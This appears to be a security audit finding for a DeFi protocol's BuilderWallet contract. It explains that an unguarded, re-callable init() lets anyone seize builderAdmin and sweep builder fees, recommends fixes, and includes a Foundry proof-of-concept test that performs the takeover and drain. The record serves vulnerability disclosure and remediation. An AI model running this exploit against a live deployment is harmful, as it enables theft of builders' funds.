  "title": "`BuilderWallet.init()` is permissionless and re-initializable, allowing anyone to take over `builderAdmin` and sweep builder fees",
  "severity": "high",
  "validity": "valid",
  "quality": "sufficient",
  "user_handle": "wuji",
  "body": "## Finding description and impact\n\n`BuilderWallet` is the fee recipient for “builder split” commissions. It exposes:\n\n- `init(address _builderAdmin)` (external) which writes `builderAdmin` with **no access control** and **no one-time initialization guard**.\n- `sweep(address token, address to)` which allows the current `builderAdmin` to transfer the wallet’s full token balance.\n\nBecause `init()` is callable by anyone at any time, any attacker can:\n\n1. Call `BuilderWallet.init(attacker)` to overwrite `builderAdmin`.\n2. Call `BuilderWallet.sweep(token, attacker)` to drain any assets held by the wallet.\n\nThis is especially impactful because the protocol can route commissions directly to `riskParameters.feeRecipient()` (the builder wallet address) during option mint/burn settlement:\n\n- In `CollateralTracker.settleMint`, when `riskParameters.feeRecipient() != 0`, shares are split and transferred to both `riskEngine()` (protocol split) and `feeRecipient` (builder split).\n- In `CollateralTracker.settleBurn`, when `riskParameters.feeRecipient() != 0`, shares are similarly split and transferred.\n\nAs a result, any accumulated builder fees (shares/tokens) that reach the `BuilderWallet` can be stolen permissionlessly, causing direct loss of funds intended for builders (and any downstream accounting/fee distribution relying on this mechanism).\n\n## Recommended mitigation steps\n\n- Restrict `BuilderWallet.init()` so **only** the `FACTORY` can call it (e.g., `require(msg.sender == FACTORY)`).\n- Add a one-time initialization guard so it can only be executed once (e.g., `require(builderAdmin == address(0))`).\n\nOptionally, consider a more robust approach where initialization cannot be replayed (e.g., permanently disabling `init` after the first call), while keeping the CREATE2 address derivation unchanged (since the wallet address is derived from init code and salt).",
  "proof_of_concept": "```solidity\n// SPDX-License-Identifier: MIT\npragma solidity ^0.8.24;\n\nimport \"forge-std/Test.sol\";\n\nimport {BuilderFactory, BuilderWallet} from \"@contracts/RiskEngine.sol\";\nimport {ERC20S} from \"../testUtils/ERC20S.sol\";\n\ncontract Finding001_BuilderWalletInit is Test {\n    address internal OWNER = address(0xA11CE);\n    address internal BUILDER_ADMIN = address(0xB0B);\n    address internal ATTACKER = address(0xBAD);\n\n    function test_PoC_Finding001_AttackerCanReinitAndSweep() public {\n        // 1) Deploy BuilderFactory (real implementation, not a mock)\n        BuilderFactory factory = new BuilderFactory(OWNER);\n\n        // 2) OWNER deploys BuilderWallet and initializes builderAdmin\n        uint48 builderCode = 42;\n        address walletAddr;\n        vm.prank(OWNER);\n        walletAddr = factory.deployBuilder(builderCode, BUILDER_ADMIN);\n\n        BuilderWallet wallet = BuilderWallet(walletAddr);\n        assertEq(wallet.builderAdmin(), BUILDER_ADMIN, \"wallet should be initialized to builder admin\");\n\n        // 3) Fund the wallet with sweepable assets (simulating accumulated builder fees)\n        ERC20S token = new ERC20S(\"Test Token\", \"TST\", 18);\n        uint256 amount = 1_000 ether;\n        token.mint(walletAddr, amount);\n        assertEq(token.balanceOf(walletAddr), amount, \"wallet funded\");\n\n        // 4) Attacker can reset builderAdmin without any permissions\n        vm.prank(ATTACKER);\n        wallet.init(ATTACKER);\n        assertEq(wallet.builderAdmin(), ATTACKER, \"attacker took over builderAdmin\");\n\n        // 5) Attacker sweeps the entire balance\n        uint256 attackerBefore = token.balanceOf(ATTACKER);\n        vm.prank(ATTACKER);\n        wallet.sweep(address(token), ATTACKER);\n\n        assertEq(token.balanceOf(walletAddr), 0, \"wallet drained\");\n        assertEq(token.balanceOf(ATTACKER), attackerBefore + amount, \"attacker profited\");\n    }\n}\n```",
